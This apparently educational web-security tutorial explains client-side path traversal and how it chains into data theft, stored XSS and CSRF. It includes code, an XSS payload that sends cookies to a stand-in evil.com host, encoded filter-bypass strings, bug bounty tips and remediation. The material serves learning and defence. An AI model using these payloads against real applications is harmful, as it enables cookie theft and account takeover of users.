Client-Side Path Traversal to Stored XSS

Inspired by matanber's CSPT research (OWASP AppSec 2024) · Emerging attack class

Vulnerability

Client-side JavaScript uses user input to construct a fetch() URL path. By injecting path traversal sequences (../), an attacker can redirect the fetch request to a different API endpoint. When the response is rendered as HTML, the attacker controls what the victim sees — and what code executes.

What is CSPT?

Client-Side Path Traversal (CSPT) is the client-side equivalent of server-side path traversal. Instead of traversing the filesystem, you're traversing the API URL path constructed by JavaScript:

// Application code - loads user notifications
function loadNotifications(userId) {
  fetch('/api/notifications/' + userId)
    .then(r => r.json())
    .then(data => {
      document.getElementById('notifs').innerHTML = data.html;
    });
}

// Normal use:
loadNotifications('user123');
// Fetches: /api/notifications/user123

// CSPT attack - userId from URL parameter:
// ?userId=../settings/admin
loadNotifications('../settings/admin');
// Fetches: /api/notifications/../settings/admin
// Resolves to: /api/settings/admin
// Attacker reads admin settings!

The Three CSPT Attack Patterns

Pattern 1: CSPT to Data Theft (IDOR)

Traverse to read other users' data from different API endpoints:

// App fetches: /api/users/{userId}/profile
// Attack: userId = ../admin/profile
// Fetches: /api/users/../admin/profile → /api/admin/profile

// Or access other users:
// userId = ../../users/victim123/profile
// Fetches: /api/users/../../users/victim123/profile
//        → /api/users/victim123/profile

Pattern 2: CSPT to XSS via Response Injection

This is the most powerful pattern. If the application has a file upload endpoint, the attacker uploads a malicious JSON response, then traverses the fetch path to load their uploaded file instead of the legitimate API response:

// Step 1: Upload malicious "response" via file upload API
fetch('/api/upload', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    content: JSON.stringify({
      html: '<img src=x onerror="fetch(\\'https://evil.com/steal?c=\\'+document.cookie)">',
      status: 'success'
    }),
    contentType: 'application/json'
  })
});
// Returns: { fileId: "abc123", url: "/api/files/abc123" }

// Step 2: Craft URL that traverses to the uploaded file
// Normal: /api/notifications/{userId}
// Attack: /api/notifications/../../api/files/abc123
//       → /api/files/abc123 (attacker's malicious JSON!)

// Step 3: The app renders the response HTML
// document.getElementById('notifs').innerHTML = data.html;
// → XSS fires! Attacker's onerror handler executes

Pattern 3: CSPT to CSRF (CSPT2CSRF)

The most devastating chain. If the app loads settings from an API and auto-submits based on the response, CSPT lets the attacker control the "settings" response and trigger arbitrary actions:

// App code: loads settings and auto-applies them
async function loadSettings(section) {
  const resp = await fetch('/api/settings/' + section);
  const config = await resp.json();

  // Auto-applies settings from the response
  if (config.email) {
    await fetch('/api/user/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',
      body: JSON.stringify({ email: config.email })
    });
  }
}

// Normal: loadSettings('notifications')
// → Fetches /api/settings/notifications
// → Returns { notifications: true, theme: 'dark' }

// CSPT2CSRF attack:
// Step 1: Upload fake settings JSON
// { "email": "attacker@evil.com" }
// Stored at: /api/files/xyz789

// Step 2: Craft URL: ?section=../../api/files/xyz789
// → Fetches /api/settings/../../api/files/xyz789
// → Returns the attacker's JSON with email field
// → App auto-changes victim's email to attacker@evil.com!

// Step 3: Attacker resets password → Full ATO

The CSPT2CSRF Chain

Step 1: Upload a malicious JSON file with the desired CSRF action data

Step 2: Send victim a URL with path traversal pointing to the uploaded file

Step 3: App fetches attacker's JSON instead of real settings

Step 4: App auto-submits a state-changing request using attacker's data

Result: CSRF without needing to bypass CSRF tokens — the legitimate app makes the request!

Filter Bypass Techniques

When the app tries to block path traversal:

// Filter: strips forward slashes
userId = userId.replace(/\//g, '');
// Bypass: use backslashes (equivalent in URLs)
// ?userId=..\..\api\files\abc123

// Filter: strips "../"
userId = userId.replace(/\.\.\//g, '');
// Bypass: double encoding
// ?userId=..%252f..%252fapi%252ffiles%252fabc123

// Filter: blocks ".." anywhere
userId = userId.replace(/\.\./g, '');
// Bypass: URL normalization
// ?userId=.%2e/.%2e/api/files/abc123
// After URL decoding: ../../api/files/abc123

// Filter: checks for "api" in path
// Bypass: case variation or encoding
// ?userId=..%2f..%2fAPI%2ffiles%2fabc123

Why It Matters

CSPT is an emerging attack class that most developers don't know about. It bypasses traditional CSRF protections because the legitimate application makes the state-changing request — with valid CSRF tokens, cookies, and headers. The attacker only controls the data the app acts on, not the request itself. This makes CSPT2CSRF particularly dangerous on applications with strong CSRF defenses.

Bug Bounty Tip

To find CSPT: (1) Search JS for fetch( and XMLHttpRequest where the URL contains user input. (2) Look for URL params, hash fragments, or postMessage data used in API paths. (3) Test with ../ to see if you can reach different endpoints. (4) Check if the app has a file upload endpoint that returns a URL — that's your response injection target. (5) Look at what the app does with the API response — innerHTML? Auto-submit? Cookie setting? The sink determines the impact.

Remediation

  • Validate user input used in fetch URLs — reject or strip .., /, \, and encoded variants
  • Use allowlists for path segments instead of blocklists
  • Validate API responses before acting on them (check expected schema)
  • Don't auto-submit forms or change settings based on API response data
  • Use URL() constructor to normalize paths and detect traversal
